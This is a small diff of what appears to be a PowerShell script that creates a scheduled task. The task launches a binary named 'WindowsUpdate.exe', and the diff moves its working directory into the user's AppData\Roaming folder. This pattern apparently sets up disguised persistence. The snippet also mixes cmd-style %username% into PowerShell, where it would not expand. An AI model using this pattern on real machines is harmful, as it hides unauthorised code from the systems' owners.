@@ -6,7 +6,7 @@ echo [+] Creating Task...
 $taskAction = New-ScheduledTaskAction `
     -Execute 'WindowsUpdate.exe' `
     -Argument "/c" `
-    -WorkingDirectory "C:\Windows\Temp"
+    -WorkingDirectory "C:\Users\%username%\AppData\Roaming"
 
 #triggering
 $trigger = New-ScheduledTaskTrigger `
